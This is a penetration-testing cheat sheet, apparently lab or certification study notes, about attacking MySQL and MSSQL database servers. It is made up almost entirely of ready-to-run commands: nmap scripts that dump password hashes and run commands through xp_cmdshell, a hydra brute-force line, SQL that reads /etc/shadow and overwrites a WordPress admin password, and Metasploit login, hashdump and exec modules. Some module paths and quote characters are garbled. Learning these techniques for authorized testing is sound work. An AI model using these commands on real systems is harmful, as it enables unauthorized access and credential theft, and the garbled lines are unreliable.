# **SQL**

--------------------------------------------------------------------

### Nmap Scripts

```
> MYSQL

nmap 0.0.0.0 -SV -p 3306 —script=mysql-empty-password

nmap 0.0.0.0 -SV -p 3306 —script=mysql-info

nmap 0.0.0.0 -SV -p 3306 —script=mysql-users —script-args=”mysqluser=’root’, mysqlpass=’’”

nmap 0.0.0.0 -SV -p 3306 —script=mysql-databases—script-args=”mysqluser=’root’, mysqlpass=’’”

nmap 0.0.0.0 -SV -p 3306 —script=mysql-variables —script-args=”mysqluser=’root’, mysqlpass=’’”

nmap 0.0.0.0 -SV -p 3306 —script=mysql-audit—script-args=”mysql-audit.username=’root’, mysql-audit.password=’’”,mysql-audit.filename=’/usr/share/nmap/nselib/data/mysql-cis.audit’”

nmap 0.0.0.0 -SV -p 3306 —script=mysql-dump-hashes —script-args=”username=’root’, password=’’”

nmap 0.0.0.0 -SV -p 3306 —script=mysql-query —script-args=”query=’select count(*) from books.authors;’,username=’root’, password=’’”


> MSSQL:

nmap 0.0.0.0 -p 1433 —script ms-sql-info

nmap 0.0.0.0 -p 1433 —script ms-sql-info —script-args mssql-instance-port=1433

nmap 0.0.0.0 -p 1433 —script ms-sql-brute —script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt

nmap 0.0.0.0 -p 1433 —script ms-sql-empty-password

nmap 0.0.0.0 -p 1433 —script ms-sql-query —script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query=”SELECT * FROM master..syslogins” -oN output.txt”

nmap 0.0.0.0 -p 1433 —script ms-sql-dump-hashes —script-args mssql.username=admin,mssql.password=anamaria

nmap 0.0.0.0 -p 1433 —script ms-sql-xp-cmdshell —script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd=”ipconfig”
```

--------------------------------------------------------------------

### BRUTEFORCE

```
$ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 0.0.0.0 mysql
```

--------------------------------------------------------------------

### Trying login

```
$ mysql -h 0.0.0.0 -u root
```

--------------------------------------------------------------------

### Useful SQL Commands

```
$ show databases;

$ use books;

$ select * from authors;

$ select load_file(”/etc/shadow”)

$ UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';

http://<TARGET-IP>/8585/wordpress/wp-admin
```

--------------------------------------------------------------------

### Metasploit Modules

```
> MYSQL:

- use /auxiliary/scanner/mysql/mysql_login
> set pass_file /usr/share/metasploit_framework/data/wordlists/unix_passwords.txt
> set stop_on_succes true

- auxiliary/admin/mysql/mysql_enum

- auxiliary/admin/mysql/mysql_sql

- auxiliary/scanner/mysql/mysql_file_enum

- auxiliary/scanner/mysql/mysql_hashdump

- auxiliary/scanner/mysql/mysql_login

- auxiliary/scanner/mysql/mysql_schemadump

- auxiliary/scanner/mysql/mysql_version

- auxiliary/scanner/mysql/mysql_writable_dirs


> MSSQL:

- use auxiliary/scanner/mssql/mssql_login
> set user_file /root/Desktop/wordlist/common_users.txt
> set pass_file…

- use auxiliary/admin/ssql/ssql_enum

- use auxiliary/admin/ssql/ssql_enum_ssql_logins

- use auxiliary/admin/ssql/ssql_exec

- use auxiliary/admin/ssql/ssql_enum_domain_accounts
```

--------------------------------------------------------------------